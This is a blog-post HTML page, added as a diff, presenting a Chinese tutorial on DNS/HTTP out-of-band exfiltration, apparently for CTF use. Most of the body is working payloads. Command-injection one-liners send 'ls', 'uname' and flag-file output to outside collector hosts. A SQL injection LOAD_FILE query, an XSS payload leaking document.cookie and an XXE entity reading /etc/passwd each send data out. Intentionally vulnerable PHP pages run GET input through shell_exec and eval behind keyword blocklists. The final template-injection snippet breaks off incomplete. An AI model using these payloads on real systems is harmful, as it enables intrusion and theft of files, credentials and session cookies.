@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="DNSlog外带技巧详解一、原理核心DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。  WebLog管理  二、基础用法12# 基础命令执行示例ping -c 1 &#96;whoami&#96;.YoungKing.eyes.sh  三、无回显RCE123# 无回显命令执行示例curl http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dns外带">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="DNSlog外带技巧详解一、原理核心DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。  WebLog管理  二、基础用法12# 基础命令执行示例ping -c 1 &#96;whoami&#96;.YoungKing.eyes.sh  三、无回显RCE123# 无回显命令执行示例curl http">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-23T12:09:45.000Z">
+<meta property="article:modified_time" content="2025-04-23T12:10:26.362Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>dns外带</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/21/pinghang2025group/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&text=dns外带"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&is_video=false&description=dns外带"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dns外带&body=Check out this article: https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&name=dns外带&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&t=dns外带"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog%E5%A4%96%E5%B8%A6%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">DNSlog外带技巧详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E6%A0%B8%E5%BF%83"><span class="toc-number">1.1.</span> <span class="toc-text">一、原理核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、基础用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.3.</span> <span class="toc-text">三、无回显RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%BF%87%E6%BB%A4%E6%A0%B7%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">四、过滤样式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">无回显示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%A4%96%E5%B8%A6"><span class="toc-number">1.4.2.</span> <span class="toc-text">文件内容外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Collaborator%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">Collaborator示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%AB%98%E9%98%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.5.</span> <span class="toc-text">五、高阶应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 无回显命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. SQL盲注外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-XSS%E7%BB%95%E8%BF%87CSP"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. XSS绕过CSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XXE%E7%9B%B2%E6%89%93"><span class="toc-number">1.5.4.</span> <span class="toc-text">4. XXE盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-SSRF-print%E8%BF%87%E6%BB%A4"><span class="toc-number">1.5.5.</span> <span class="toc-text">5. SSRF print过滤</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        dns外带
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-23T12:09:45.000Z" class="dt-published" itemprop="datePublished">2025-04-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="DNSlog外带技巧详解"><a href="#DNSlog外带技巧详解" class="headerlink" title="DNSlog外带技巧详解"></a>DNSlog外带技巧详解</h1><h2 id="一、原理核心"><a href="#一、原理核心" class="headerlink" title="一、原理核心"></a>一、原理核心</h2><p>DNSlog外带利用DNS协议层级穿透性强的特点，通过构造特殊域名查询将敏感数据外传。数据以子域名形式发送至攻击者控制的DNS服务器，服务器记录查询日志实现数据回传。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://eyes.sh/web/">WebLog管理</a></li>
+</ul>
+<h2 id="二、基础用法"><a href="#二、基础用法" class="headerlink" title="二、基础用法"></a>二、基础用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础命令执行示例</span></span><br><span class="line">ping -c 1 `<span class="built_in">whoami</span>`.YoungKing.eyes.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、无回显RCE"><a href="#三、无回显RCE" class="headerlink" title="三、无回显RCE"></a>三、无回显RCE</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无回显命令执行示例</span></span><br><span class="line">curl http://vbruus9t.requestrepo.com/?1= `<span class="built_in">ls</span>`</span><br><span class="line">/?cmd=curl http://YoungKing.eyes.sh/?1= `<span class="built_in">ls</span>`</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、过滤样式绕过"><a href="#四、过滤样式绕过" class="headerlink" title="四、过滤样式绕过"></a>四、过滤样式绕过</h2><h3 id="无回显示例"><a href="#无回显示例" class="headerlink" title="无回显示例"></a>无回显示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|dnslog/i&quot;</span>,<span class="variable">$cmd</span>))&#123;     </span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">//flag.php  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;  </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件内容外带"><a href="#文件内容外带" class="headerlink" title="文件内容外带"></a>文件内容外带</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于无法解析换行，经常需要base64编码</span></span><br><span class="line">curl http://YoungKing.eyes.sh/?1= `<span class="built_in">ls</span> .|<span class="built_in">base64</span>`</span><br><span class="line">curl http://vbruus9t.requestrepo.com/?1= `<span class="built_in">ls</span> .|<span class="built_in">base64</span>`</span><br></pre></td></tr></table></figure>
+
+<h3 id="Collaborator示例"><a href="#Collaborator示例" class="headerlink" title="Collaborator示例"></a>Collaborator示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php http:<span class="comment">//5djwt01qp1saqhwosujdblpjcai16rug.oastify.com</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="五、高阶应用场景"><a href="#五、高阶应用场景" class="headerlink" title="五、高阶应用场景"></a>五、高阶应用场景</h2><h3 id="1-无回显命令执行"><a href="#1-无回显命令执行" class="headerlink" title="1. 无回显命令执行"></a>1. 无回显命令执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多级命令嵌套</span></span><br><span class="line">curl <span class="string">&quot;http://<span class="subst">$(uname -a|base64|tr +/ -_)</span>.YoungKing.eyes.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件内容外带（前30字符）</span></span><br><span class="line">curl <span class="string">&quot;http://<span class="subst">$(head -c30 /flag|xxd -p)</span>.YoungKing.eyes.sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SQL盲注外带"><a href="#2-SQL盲注外带" class="headerlink" title="2. SQL盲注外带"></a>2. SQL盲注外带</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> MID(flag,<span class="number">1</span>,<span class="number">30</span>) <span class="keyword">FROM</span> flag),<span class="string">&#x27;.mysql.YoungKing.eyes.sh.eyes.sh\\test&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-XSS绕过CSP"><a href="#3-XSS绕过CSP" class="headerlink" title="3. XSS绕过CSP"></a>3. XSS绕过CSP</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 当CSP禁止fetch/XMLHttpRequest时 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location=<span class="string">&#x27;http://&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">50</span>)+<span class="string">&#x27;.xss.target.eyes.sh&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-XXE盲打"><a href="#4-XXE盲打" class="headerlink" title="4. XXE盲打"></a>4. XXE盲打</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param</span> <span class="string">&quot;&lt;!ENTITY % exfil SYSTEM &#x27;http://%payload;.xxe.target.eyes.sh&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-SSRF-print过滤"><a href="#5-SSRF-print过滤" class="headerlink" title="5. SSRF print过滤"></a>5. SSRF print过滤</h3><pre><code>?name=
+&#123;%set a=dict(po=aa,p=aa)|join%&#125;
+&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%&#125;
+&#123;%set k=dict(eeeeeeeee=a)|join|count%&#125;
+&#123;%set l=dict(eeeeeeee=a)|join|count%&#125;
+</code></pre>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog%E5%A4%96%E5%B8%A6%E6%8A%80%E5%B7%A7%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">DNSlog外带技巧详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E6%A0%B8%E5%BF%83"><span class="toc-number">1.1.</span> <span class="toc-text">一、原理核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、基础用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.3.</span> <span class="toc-text">三、无回显RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%BF%87%E6%BB%A4%E6%A0%B7%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">四、过滤样式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">无回显示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%A4%96%E5%B8%A6"><span class="toc-number">1.4.2.</span> <span class="toc-text">文件内容外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Collaborator%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">Collaborator示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%AB%98%E9%98%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.5.</span> <span class="toc-text">五、高阶应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 无回显命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E7%9B%B2%E6%B3%A8%E5%A4%96%E5%B8%A6"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. SQL盲注外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-XSS%E7%BB%95%E8%BF%87CSP"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. XSS绕过CSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XXE%E7%9B%B2%E6%89%93"><span class="toc-number">1.5.4.</span> <span class="toc-text">4. XXE盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-SSRF-print%E8%BF%87%E6%BB%A4"><span class="toc-number">1.5.5.</span> <span class="toc-text">5. SSRF print过滤</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&text=dns外带"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&is_video=false&description=dns外带"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dns外带&body=Check out this article: https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&title=dns外带"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&name=dns外带&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/04/23/dns%E5%A4%96%E5%B8%A6/&t=dns外带"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
